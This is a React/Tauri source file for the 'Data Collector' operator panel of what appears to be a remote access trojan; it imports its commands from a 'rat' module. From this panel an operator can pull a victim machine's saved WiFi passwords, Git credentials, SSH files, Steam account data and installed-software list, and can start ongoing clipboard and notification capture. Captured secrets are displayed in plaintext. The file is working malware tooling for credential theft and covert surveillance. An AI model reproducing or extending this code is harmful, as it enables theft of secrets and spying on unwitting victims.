import React, { useEffect, useMemo, useState } from "react";
import { useParams } from "react-router-dom";
import { listen } from "@tauri-apps/api/event";
import {
  requestWifiDataCmd,
  requestSoftwareInventoryCmd,
  requestGitDataCmd,
  requestSSHDataCmd,
  requestSteamDataCmd,
  startClipboardMonitorCmd,
  stopClipboardMonitorCmd,
  startNotificationCaptureCmd,
  stopNotificationCaptureCmd,
} from "../rat/RATCommands";
import {
  WifiDataPayload,
  SoftwareInventoryPayload,
  GitDataPayload,
  SSHDataPayload,
  SteamDataPayload,
  ClipboardUpdatePayload,
  NotificationEventPayload,
  WifiProfile,
  SoftwareEntry,
  GitCredentialEntry,
  ExtractedFile,
  SteamAccountEntry,
} from "../../types";
import {
  IconWifi,
  IconApps,
  IconBrandGithub,
  IconLock,
  IconSteam,
  IconClipboard,
  IconBell,
} from "@tabler/icons-react";

export const DataCollector: React.FC = () => {
  const { addr } = useParams();
  const [status, setStatus] = useState("Ready to collect data");
  const [wifiProfiles, setWifiProfiles] = useState<WifiProfile[]>([]);
  const [softwareApps, setSoftwareApps] = useState<SoftwareEntry[]>([]);
  const [gitCredentials, setGitCredentials] = useState<GitCredentialEntry[]>([]);
  const [gitConfigs, setGitConfigs] = useState<ExtractedFile[]>([]);
  const [sshFiles, setSshFiles] = useState<ExtractedFile[]>([]);
  const [steamAccounts, setSteamAccounts] = useState<SteamAccountEntry[]>([]);
  const [steamFiles, setSteamFiles] = useState<ExtractedFile[]>([]);
  const [clipboardHistory, setClipboardHistory] = useState<string[]>([]);
  const [notifications, setNotifications] = useState<NotificationEventPayload["data"][]>([]);
  const [clipboardRunning, setClipboardRunning] = useState(false);
  const [notificationRunning, setNotificationRunning] = useState(false);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    let unlistenWifi: (() => void) | null = null;
    let unlistenSoftware: (() => void) | null = null;
    let unlistenGit: (() => void) | null = null;
    let unlistenSSH: (() => void) | null = null;
    let unlistenSteam: (() => void) | null = null;
    let unlistenClipboard: (() => void) | null = null;
    let unlistenNotification: (() => void) | null = null;

    const setupListeners = async () => {
      unlistenWifi = await listen("wifi_data", (event) => {
        const payload = event.payload as WifiDataPayload;
        if (payload.addr !== addr) return;
        setWifiProfiles(payload.data.profiles);
        setStatus("WiFi profiles recovered");
        setLoading(false);
      });

      unlistenSoftware = await listen("software_inventory", (event) => {
        const payload = event.payload as SoftwareInventoryPayload;
        if (payload.addr !== addr) return;
        setSoftwareApps(payload.data.applications);
        setStatus("Software inventory recovered");
        setLoading(false);
      });

      unlistenGit = await listen("git_data", (event) => {
        const payload = event.payload as GitDataPayload;
        if (payload.addr !== addr) return;
        setGitCredentials(payload.data.credentials);
        setGitConfigs(payload.data.configs);
        setStatus("Git data recovered");
        setLoading(false);
      });

      unlistenSSH = await listen("ssh_data", (event) => {
        const payload = event.payload as SSHDataPayload;
        if (payload.addr !== addr) return;
        setSshFiles(payload.data.files);
        setStatus("SSH files recovered");
        setLoading(false);
      });

      unlistenSteam = await listen("steam_data", (event) => {
        const payload = event.payload as SteamDataPayload;
        if (payload.addr !== addr) return;
        setSteamAccounts(payload.data.accounts);
        setSteamFiles(payload.data.files);
        setStatus("Steam data recovered");
        setLoading(false);
      });

      unlistenClipboard = await listen("clipboard_update", (event) => {
        const payload = event.payload as ClipboardUpdatePayload;
        if (payload.addr !== addr) return;
        setClipboardHistory((prev) => [payload.data.text, ...prev].slice(0, 50));
      });

      unlistenNotification = await listen("notification_event", (event) => {
        const payload = event.payload as NotificationEventPayload;
        if (payload.addr !== addr) return;
        setNotifications((prev) => [payload.data, ...prev].slice(0, 50));
      });
    };

    setupListeners();

    return () => {
      unlistenWifi?.();
      unlistenSoftware?.();
      unlistenGit?.();
      unlistenSSH?.();
      unlistenSteam?.();
      unlistenClipboard?.();
      unlistenNotification?.();
    };
  }, [addr]);

  const requestFeature = async (
    command: (addr: string | undefined) => Promise<void>,
    message: string
  ) => {
    if (!addr) return;
    setStatus(message);
    setLoading(true);
    try {
      await command(addr);
    } catch (e) {
      console.error(e);
      setStatus("Request failed");
      setLoading(false);
    }
  };

  const toggleClipboardMonitor = async () => {
    if (!addr) return;
    try {
      if (clipboardRunning) {
        await stopClipboardMonitorCmd(addr);
        setClipboardRunning(false);
        setStatus("Clipboard monitoring stopped");
      } else {
        await startClipboardMonitorCmd(addr);
        setClipboardRunning(true);
        setStatus("Clipboard monitoring started");
      }
    } catch (e) {
      console.error(e);
      setStatus("Clipboard monitor failed");
    }
  };

  const toggleNotificationCapture = async () => {
    if (!addr) return;
    try {
      if (notificationRunning) {
        await stopNotificationCaptureCmd(addr);
        setNotificationRunning(false);
        setStatus("Notification capture stopped");
      } else {
        await startNotificationCaptureCmd(addr);
        setNotificationRunning(true);
        setStatus("Notification capture started");
      }
    } catch (e) {
      console.error(e);
      setStatus("Notification capture failed");
    }
  };

  const summary = useMemo(() => {
    return {
      wifi: wifiProfiles.length,
      software: softwareApps.length,
      gitCredentials: gitCredentials.length,
      gitConfigs: gitConfigs.length,
      sshFiles: sshFiles.length,
      steamAccounts: steamAccounts.length,
      steamFiles: steamFiles.length,
      clipboard: clipboardHistory.length,
      notifications: notifications.length,
    };
  }, [wifiProfiles, softwareApps, gitCredentials, gitConfigs, sshFiles, steamAccounts, steamFiles, clipboardHistory, notifications]);

  return (
    <div className="flex flex-col h-screen bg-[#050505] text-gray-200 overflow-hidden font-sans">
      <div className="h-16 shrink-0 bg-[#0a0a0a] border-b border-[#1a1a1a] flex items-center justify-between px-6 shadow-xl z-20">
        <div className="flex items-center gap-4">
          <div className="p-2 bg-accentx/10 rounded-xl border border-accentx/20">
            <IconApps className="text-accentx" size={24} />
          </div>
          <div>
            <h1 className="text-lg font-black tracking-tighter uppercase italic text-white">
              Data Collector
            </h1>
            <p className="text-[10px] font-mono text-gray-500 uppercase tracking-widest leading-none">
              Extract WiFi, software, Git, SSH, Steam, clipboard and notifications
            </p>
          </div>
        </div>

        <div className="flex items-center gap-3">
          <span className="text-xs uppercase tracking-[0.3em] text-gray-500">
            {status}
          </span>
          <button
            onClick={() => setStatus("Ready to collect data")}
            className="rounded-xl bg-[#111] px-4 py-2 text-xs text-white hover:bg-[#222] transition"
          >
            Reset Status
          </button>
        </div>
      </div>

      <div className="flex flex-1 overflow-hidden">
        <div className="w-80 shrink-0 bg-[#080808] border-r border-[#1a1a1a] p-4 space-y-4 overflow-y-auto">
          <button
            onClick={() => requestFeature(requestWifiDataCmd, "Requesting WiFi profiles...")}
            className="flex items-center gap-2 w-full rounded-2xl bg-[#111] px-4 py-3 text-sm font-bold uppercase tracking-tight text-white hover:bg-[#1a1a1a] transition"
            disabled={loading}
          >
            <IconWifi size={18} /> WiFi
          </button>
          <button
            onClick={() => requestFeature(requestSoftwareInventoryCmd, "Requesting installed software...")}
            className="flex items-center gap-2 w-full rounded-2xl bg-[#111] px-4 py-3 text-sm font-bold uppercase tracking-tight text-white hover:bg-[#1a1a1a] transition"
            disabled={loading}
          >
            <IconApps size={18} /> Software
          </button>
          <button
            onClick={() => requestFeature(requestGitDataCmd, "Requesting Git credentials...")}
            className="flex items-center gap-2 w-full rounded-2xl bg-[#111] px-4 py-3 text-sm font-bold uppercase tracking-tight text-white hover:bg-[#1a1a1a] transition"
            disabled={loading}
          >
            <IconBrandGithub size={18} /> Git
          </button>
          <button
            onClick={() => requestFeature(requestSSHDataCmd, "Requesting SSH data...")}
            className="flex items-center gap-2 w-full rounded-2xl bg-[#111] px-4 py-3 text-sm font-bold uppercase tracking-tight text-white hover:bg-[#1a1a1a] transition"
            disabled={loading}
          >
            <IconLock size={18} /> SSH
          </button>
          <button
            onClick={() => requestFeature(requestSteamDataCmd, "Requesting Steam data...")}
            className="flex items-center gap-2 w-full rounded-2xl bg-[#111] px-4 py-3 text-sm font-bold uppercase tracking-tight text-white hover:bg-[#1a1a1a] transition"
            disabled={loading}
          >
            <IconSteam size={18} /> Steam
          </button>
          <button
            onClick={toggleClipboardMonitor}
            className={`flex items-center gap-2 w-full rounded-2xl px-4 py-3 text-sm font-bold uppercase tracking-tight transition ${clipboardRunning ? "bg-green-700" : "bg-[#111] hover:bg-[#1a1a1a]"}`}
          >
            <IconClipboard size={18} /> {clipboardRunning ? "Stop Clipboard" : "Start Clipboard"}
          </button>
          <button
            onClick={toggleNotificationCapture}
            className={`flex items-center gap-2 w-full rounded-2xl px-4 py-3 text-sm font-bold uppercase tracking-tight transition ${notificationRunning ? "bg-green-700" : "bg-[#111] hover:bg-[#1a1a1a]"}`}
          >
            <IconBell size={18} /> {notificationRunning ? "Stop Notifications" : "Start Notifications"}
          </button>
          <div className="rounded-2xl bg-[#0f0f0f] border border-[#1a1a1a] p-4">
            <div className="flex items-center justify-between text-xs uppercase tracking-[0.3em] text-gray-500 mb-3">
              <span>Summary</span>
              <span className="text-accentx">{loading ? "Loading..." : "Idle"}</span>
            </div>
            <div className="space-y-2 text-[11px] text-gray-300">
              <div>WiFi: {summary.wifi}</div>
              <div>Software: {summary.software}</div>
              <div>Git creds: {summary.gitCredentials}</div>
              <div>Git configs: {summary.gitConfigs}</div>
              <div>SSH files: {summary.sshFiles}</div>
              <div>Steam accounts: {summary.steamAccounts}</div>
              <div>Steam files: {summary.steamFiles}</div>
              <div>Clipboard events: {summary.clipboard}</div>
              <div>Notifications: {summary.notifications}</div>
            </div>
          </div>
        </div>

        <div className="flex-1 p-6 overflow-y-auto bg-[#050505]">
          <div className="grid grid-cols-1 gap-4 lg:grid-cols-2">
            <section className="rounded-3xl border border-[#1a1a1a] bg-[#0c0c0c] p-4">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-sm font-bold uppercase tracking-[0.2em] text-gray-400">WiFi Profiles</h2>
                <span className="text-xs text-gray-500">{wifiProfiles.length}</span>
              </div>
              {wifiProfiles.length === 0 ? (
                <p className="text-sm text-gray-500">No WiFi profiles collected yet.</p>
              ) : (
                <div className="space-y-3">
                  {wifiProfiles.map((profile, index) => (
                    <div key={index} className="rounded-2xl border border-[#1a1a1a] p-3 bg-[#111]">
                      <div className="text-sm font-semibold text-white">{profile.ssid}</div>
                      <div className="text-xs text-gray-400 mt-2">Auth: {profile.authentication}</div>
                      <div className="text-xs text-gray-400">Cipher: {profile.cipher}</div>
                      <div className="text-xs text-gray-300 mt-2">Password: {profile.password}</div>
                    </div>
                  ))}
                </div>
              )}
            </section>

            <section className="rounded-3xl border border-[#1a1a1a] bg-[#0c0c0c] p-4">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-sm font-bold uppercase tracking-[0.2em] text-gray-400">Software</h2>
                <span className="text-xs text-gray-500">{softwareApps.length}</span>
              </div>
              {softwareApps.length === 0 ? (
                <p className="text-sm text-gray-500">No software inventory available.</p>
              ) : (
                <div className="space-y-3 max-h-[420px] overflow-y-auto pr-2">
                  {softwareApps.slice(0, 16).map((app, index) => (
                    <div key={index} className="rounded-2xl border border-[#1a1a1a] p-3 bg-[#111]">
                      <div className="text-sm font-semibold text-white">{app.name}</div>
                      <div className="text-xs text-gray-400 mt-1">Version: {app.version || "n/a"}</div>
                      <div className="text-xs text-gray-400">Publisher: {app.publisher || "n/a"}</div>
                      <div className="text-xs text-gray-400">Location: {app.install_location || "n/a"}</div>
                    </div>
                  ))}
                </div>
              )}
            </section>

            <section className="rounded-3xl border border-[#1a1a1a] bg-[#0c0c0c] p-4">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-sm font-bold uppercase tracking-[0.2em] text-gray-400">Git Credentials</h2>
                <span className="text-xs text-gray-500">{gitCredentials.length}</span>
              </div>
              {gitCredentials.length === 0 ? (
                <p className="text-sm text-gray-500">No Git credentials found.</p>
              ) : (
                <div className="space-y-3">
                  {gitCredentials.map((cred, index) => (
                    <div key={index} className="rounded-2xl border border-[#1a1a1a] p-3 bg-[#111]">
                      <div className="text-sm font-semibold text-white">{cred.source}</div>
                      <div className="text-xs text-gray-400 mt-1">URL: {cred.url}</div>
                      <div className="text-xs text-gray-400">User: {cred.username}</div>
                      <div className="text-xs text-gray-400">Pass: {cred.password}</div>
                    </div>
                  ))}
                </div>
              )}
            </section>

            <section className="rounded-3xl border border-[#1a1a1a] bg-[#0c0c0c] p-4">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-sm font-bold uppercase tracking-[0.2em] text-gray-400">SSH Files</h2>
                <span className="text-xs text-gray-500">{sshFiles.length}</span>
              </div>
              {sshFiles.length === 0 ? (
                <p className="text-sm text-gray-500">No SSH files extracted.</p>
              ) : (
                <div className="space-y-3 max-h-[420px] overflow-y-auto pr-2">
                  {sshFiles.slice(0, 12).map((file, index) => (
                    <div key={index} className="rounded-2xl border border-[#1a1a1a] p-3 bg-[#111]">
                      <div className="text-sm font-semibold text-accentx">{file.path}</div>
                      <div className="text-xs text-gray-400 mt-2 whitespace-pre-wrap break-all">{file.contents.slice(0, 280)}{file.contents.length > 280 ? "..." : ""}</div>
                    </div>
                  ))}
                </div>
              )}
            </section>

            <section className="rounded-3xl border border-[#1a1a1a] bg-[#0c0c0c] p-4">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-sm font-bold uppercase tracking-[0.2em] text-gray-400">Steam Data</h2>
                <span className="text-xs text-gray-500">{steamAccounts.length}</span>
              </div>
              {steamAccounts.length === 0 ? (
                <p className="text-sm text-gray-500">No Steam account records available.</p>
              ) : (
                <div className="space-y-3">
                  {steamAccounts.map((account, index) => (
                    <div key={index} className="rounded-2xl border border-[#1a1a1a] p-3 bg-[#111]">
                      <div className="text-sm font-semibold text-white">{account.account_name || account.persona_name || account.steam_id}</div>
                      <div className="text-xs text-gray-400 mt-1">Persona: {account.persona_name}</div>
                      <div className="text-xs text-gray-400">Last logon: {account.last_logon}</div>
                      <div className="text-xs text-gray-400">Details: {account.details.slice(0, 160)}{account.details.length > 160 ? "..." : ""}</div>
                    </div>
                  ))}
                </div>
              )}
            </section>
          </div>

          <div className="mt-6 grid grid-cols-1 gap-4 lg:grid-cols-2">
            <section className="rounded-3xl border border-[#1a1a1a] bg-[#0c0c0c] p-4">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-sm font-bold uppercase tracking-[0.2em] text-gray-400">Clipboard History</h2>
                <span className="text-xs text-gray-500">{clipboardHistory.length}</span>
              </div>
              <div className="space-y-3 max-h-[320px] overflow-y-auto pr-2">
                {clipboardHistory.length === 0 ? (
                  <p className="text-sm text-gray-500">No clipboard events captured.</p>
                ) : (
                  clipboardHistory.map((text, index) => (
                    <div key={index} className="rounded-2xl border border-[#1a1a1a] p-3 bg-[#111] text-xs text-gray-300 whitespace-pre-wrap break-all">
                      {text}
                    </div>
                  ))
                )}
              </div>
            </section>

            <section className="rounded-3xl border border-[#1a1a1a] bg-[#0c0c0c] p-4">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-sm font-bold uppercase tracking-[0.2em] text-gray-400">Notification Events</h2>
                <span className="text-xs text-gray-500">{notifications.length}</span>
              </div>
              <div className="space-y-3 max-h-[320px] overflow-y-auto pr-2">
                {notifications.length === 0 ? (
                  <p className="text-sm text-gray-500">No notifications captured.</p>
                ) : (
                  notifications.map((event, index) => (
                    <div key={index} className="rounded-2xl border border-[#1a1a1a] p-3 bg-[#111]">
                      <div className="text-sm font-semibold text-white">{event.title || event.source}</div>
                      <div className="text-xs text-gray-400 mt-1">{event.timestamp}</div>
                      <div className="text-xs text-gray-300 mt-2 whitespace-pre-wrap break-all">{event.message}</div>
                    </div>
                  ))
                )}
              </div>
            </section>
          </div>
        </div>
      </div>
    </div>
  );
};
